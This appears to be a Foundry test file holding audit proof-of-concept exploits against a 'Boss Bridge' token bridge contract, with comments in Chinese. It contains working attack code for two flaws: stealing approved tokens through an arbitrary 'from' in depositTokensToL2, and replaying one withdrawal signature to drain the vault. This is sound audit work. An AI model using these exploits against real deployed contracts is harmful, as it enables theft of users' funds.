// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test } from "forge-std/Test.sol";
import { L1BossBridge } from "../src/L1BossBridge.sol";
import { L1Vault } from "../src/L1Vault.sol";
import { L1Token } from "../src/L1Token.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";
import { MessageHashUtils } from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";

contract BossBridgeAuditPoC is Test {
    L1Token token;
    L1BossBridge bridge;
    L1Vault vault;
    address owner = makeAddr("owner");

    function setUp() public {
        vm.startPrank(owner);
        token = new L1Token();
        bridge = new L1BossBridge(IERC20(address(token)));
        vault = bridge.vault();
        // owner distributes the whole supply (owner is the deployer / holder)
        token.transfer(address(this), token.balanceOf(owner));
        vm.stopPrank();
    }

    // ---------------------------------------------------------------------
    // H-1: depositTokensToL2 的 from 任意 —— 任何人可盗取已授权用户的代币
    // ---------------------------------------------------------------------
    function test_H1_arbitraryFrom_stealsApprovedTokens() public {
        address victim = makeAddr("victim");
        address attacker = makeAddr("attacker");
        uint256 amount = 10_000e18;

        // 受害者为了存款，按正常流程授权桥
        token.transfer(victim, amount);
        vm.prank(victim);
        token.approve(address(bridge), type(uint256).max);

        // 攻击者用受害者的授权，把币拉走并在 L2 记到自己名下
        vm.prank(attacker);
        // Deposit(victim, attacker, amount) 会被 emit —— L2 把币记到 attacker 名下
        bridge.depositTokensToL2(victim, attacker, amount);

        assertEq(token.balanceOf(victim), 0, "victim drained");
        assertEq(token.balanceOf(address(vault)), amount, "tokens pulled into vault");
        // L2 侧：attacker 将凭该事件拿到币 —— 等于偷走了 victim 的存款
    }

    // ---------------------------------------------------------------------
    // H-3: 提现签名无防重放 —— 一个合法签名可被无限重放抽干金库
    // ---------------------------------------------------------------------
    function test_H3_signatureReplay_drainsVault() public {
        // 金库里有钱(模拟已有锁仓)
        uint256 vaultStart = 50_000e18;
        token.transfer(address(vault), vaultStart);

        // 一个合法 signer
        (address signer, uint256 signerKey) = makeAddrAndKey("signer");
        vm.prank(owner);
        bridge.setSigner(signer, true);

        address attacker = makeAddr("attacker");
        uint256 amount = 10_000e18;

        // signer 对一次提现签名(to=attacker, amount)
        bytes memory message = abi.encode(
            address(token),
            uint256(0),
            abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, amount))
        );
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(keccak256(message));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerKey, digest);

        // 同一个签名反复重放 —— 每次都成功
        for (uint256 i = 0; i < 5; i++) {
            bridge.withdrawTokensToL1(attacker, amount, v, r, s);
        }

        assertEq(token.balanceOf(attacker), 5 * amount, "replayed 5x with one signature");
        assertEq(token.balanceOf(address(vault)), vaultStart - 5 * amount, "vault bled by replay");
    }
}
